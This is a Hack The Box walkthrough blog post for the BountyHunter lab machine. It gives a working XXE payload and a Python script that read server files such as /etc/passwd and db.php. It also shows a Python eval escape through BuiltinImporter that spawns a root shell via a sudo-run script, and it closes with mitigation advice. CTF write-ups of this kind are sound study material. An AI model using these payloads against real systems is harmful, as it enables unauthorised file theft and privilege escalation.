---
layout: post
title: Hack The Box Walkthrough - BountyHunter
date: 2022-07-03
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2022/07/HTB/BountyHunter
img: 2022/07/BountyHunter/BountyHunter.png
---


* Room: BountyHunter
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/BountyHunter](https://app.hackthebox.com/machines/BountyHunter)
* Author: [ejedev](https://app.hackthebox.com/users/280547)

This is a very easy box where you have to exploit and XXE vulnerability to get a shell before abusing a python program to get root. 


## Opened Ports

As always, I started the box by running RustScan to find open ports. 

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.166:22
Open 10.129.95.166:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

...

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLosZOXFZWvSPhPmfUE7v+PjfXGErY0KCPmAWrTUkyyFWRFO3gwHQMQqQUIcuZHmH20xMb+mNC6xnX2TRmsyaufPXLmib9Wn0BtEYbVDlu2mOdxWfr+LIO8yvB+kg2Uqg+QHJf7SfTvdO606eBjF0uhTQ95wnJddm7WWVJlJMng7+/1NuLAAzfc0ei14XtyS1u6
gDvCzXPR5xus8vfJNSp4n4B5m4GUPqI7odyXG2jK89STkoI5MhDOtzbrQydR0ZUg2PRd5TplgpmapDzMBYCIxH6BwYXFgSU3u3dSxPJnIrbizFVNIbc9ezkF39K+xJPbc9CTom8N59eiNubf63iDOck9yMH+YGk8HQof8ovp9FAT7ao5dfeb8gH9q9mRnuMOOQ9SxYwIxdtgg6mIYh4PRqHaSD5FuTZmsFzPfdnvmur
DWDqdjPZ6/CsWAkrzENv45b0F04DFiKYNLwk8xaXLum66w61jz4Lwpko58Hh+m0i4bs25wTH1VDMkguJ1js=
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlGEKJHQ/zTuLAvcemSaOeKfnvOC4s1Qou1E0o9Z0gWONGE1cVvgk1VxryZn7A0L1htGGQqmFe50002LfPQfmY=
|   256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJeoMhM6lgQjk6hBf+Lw/sWR4b1h8AEiDv+HAbTNk4J3
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-title: Bounty Hunters
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

...
```

There were two open ports:
* 22 - SSH
* 80 - HTTP

## Web site

I launched feroxbuster to look for files and directories. While it ran, I opened firefox and looked at the website.

![Main Site](/assets/images/2022/07/BountyHunter/MainSite.png "Main Site")

There was a contact form on the bottom of the page, but submitting it did nothing. Most of the links were not going anywhere. Only the Portal link worked. It took me to a simple page that had a link to a bounty tracker. That page had a form to submit exploits.

![Bounty Report System](/assets/images/2022/07/BountyHunter/BuntyReportSystem.png "Bounty Report System")

I looked at the POST requests that were sent when submitting a report. 

```http
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 221
Origin: http://target.htb
Connection: close
Referer: http://target.htb/log_submit.php

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50aXRsZTwvdGl0bGU%2BCgkJPGN3ZT5jd2U8L2N3ZT4KCQk8Y3Zzcz4xMDwvY3Zzcz4KCQk8cmV3YXJkPjEwMDAwMDA8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D
```

The form was submitting URL and Base64 encoded data. I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Decode()From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=) to decode it and saw that it was sending XML. 

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<bugreport>
  <title>title</title>
  <cwe>cwe</cwe>
  <cvss>10</cvss>
  <reward>1000000</reward>
</bugreport>
```

Looking at the JavaScript code that posted the data confirmed that it was just sending XML to the server.

```js
function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}
```

This looked like it could be vulnerable to [XXE (XML External Entity)](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing). To test it, I created a test payload and encoded it with [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')URL_Encode(true)&input=). 


```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>&xxe;</title>
<cwe>bbb</cwe>
<cvss>1</cvss>
<reward>10000</reward>
</bugreport>
```

I sent it to the server. And the response contained the `/etc/passwd` file. 

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

Encoding everything manually was a little painful, so I created a small script to read a file from the server and print it's content. I used PHP filters to get the file content as base64 and to be able to extract the content of PHP files without executing them.


```python
#!/bin/env python
import sys
import base64
import requests
import re

file = sys.argv[1]

# <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{file}"> ]>
xml = f"""<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file}"> ]>
<bugreport>
<title>BEGIN&xxe;END</title>
<cwe>bbb</cwe>
<cvss>1</cvss>
<reward>10000</reward>
</bugreport>"""


encoded = base64.b64encode(xml.encode("utf-8"))

data = {"data":encoded}
response = requests.post('http://target.htb/tracker_diRbPr00f314.php', data=data).text

matches = re.search("BEGIN(.*)END", response, re.DOTALL|re.MULTILINE)
if None == matches:
    print('File not found')
    sys.exit()

decoded = base64.b64decode(matches[1])
print(decoded.decode('utf-8'))
```

I started looking at files from the server, but I did not find anything I could use. Until I went back to the Feroxbuster results and saw a file called `db.php`.

I extracted that file with my script.

```bash
$ ./get_file.py db.php         
```

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "REDACTED";
$testuser = "test";
?>
```

I used the password found in the file to try to connect as the development user found in `/etc/passwd`.

```bash
$ ssh development@target
development@target's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

...

development@bountyhunter:~$ cat user.txt 
REDACTED

development@bountyhunter:~$ 
```

It worked, and I got the user flag.

## Getting root.

Once connected, I checked if I could run anything with `sudo`.

```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py

development@bountyhunter:~$ ls -l /opt/skytrain_inc/ticketValidator.py
-r-xr--r-- 1 root root 1471 Jul 22  2021 /opt/skytrain_inc/ticketValidator.py
```

I could run a Python script. That script was not writeable, so I looked at what it contained. 

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0] 
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

The script would read a file provided by the user, and if it respected the needed format, it would use [eval](https://docs.python.org/3/library/functions.html#eval) to evalute the ticket code.

The ticket code line needed to start with `**`. The rest of the line would be split on `+` signs, and the code would make sure that the part before the first `+` sign would have a reminder of 4 if divided by 7.

I crafted a ticket that would meet those conditions, and execute some Python when passed to `eval`.

```bash
development@bountyhunter:~$ cat t.md 
# Skytrain Inc
## Ticket to 

__Ticket Code:__
** 4 + print('RCE')

development@bountyhunter:~$ python3.8 /opt/skytrain_inc/ticketValidator.py 
Please enter the path to the ticket file.
t.md
Destination: 
RCE
Traceback (most recent call last):
  File "/opt/skytrain_inc/ticketValidator.py", line 52, in <module>
    main()
  File "/opt/skytrain_inc/ticketValidator.py", line 45, in main
    result = evaluate(ticket)
  File "/opt/skytrain_inc/ticketValidator.py", line 34, in evaluate
    validationNumber = eval(x.replace("**", ""))
  File "<string>", line 1, in <module>
TypeError: unsupported operand type(s) for +: 'int' and 'NoneType'
```

The script crashed, but it printed `RCE` before. So I could run Python code with it. I tried running code that did more than printing a line, but that was a little more complicated. I could not import modules to run system commands. 

I searched and found a [post](https://netsec.expert/posts/breaking-python3-eval-protections/) that explained how to view and use built-in functions in eval one-liners. 

I used the provided examples from the post to confirm that I could use the `BuiltinImporter` to import the `os` module and use it to execute commands on the server.

```bash
development@bountyhunter:~$ cat t.md 
# Skytrain Inc
## Ticket to 

__Ticket Code:__
** 4 + [x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("echo pwned")

development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
t.md
Destination: 
pwned
Invalid ticket.
```

When I confirmed that I could run system commands, I used it to launch bash as root.

```bash
development@bountyhunter:~$ cat t.md 
# Skytrain Inc
## Ticket to 

__Ticket Code:__
** 4 + [x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("/bin/bash -p")

development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
t.md
Destination: 
root@bountyhunter:/home/development# whoami
root
root@bountyhunter:/home/development# cd
root@bountyhunter:~# cat root.txt 
REDACTED
```

## Mitigation

The first vulnerability on the site is the XXE. I don't see any reason to pass the data as XML, it just adds more code, and opens the application to this kind of attack. A simple HTML form would have worked, and it would have been simpler. 

If XML was really needed, the code was easy to fix. 

```php
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
$bugreport = simplexml_import_dom($dom);
```

The call to `loadXML` should not use the [LIBXML_NOENT](https://www.php.net/manual/en/libxml.constants.php) option. If that option is removed, the XXE fails.

The next issue with the Python script that could be executed as root. Giving root permissions is always a risky thing to do. It takes a small mistake in the code to allow an attacker to escalate their privileges. And this script has a huge mistake. [eval](https://docs.python.org/3/library/functions.html#eval) should be avoided. And it should never be used on user's input.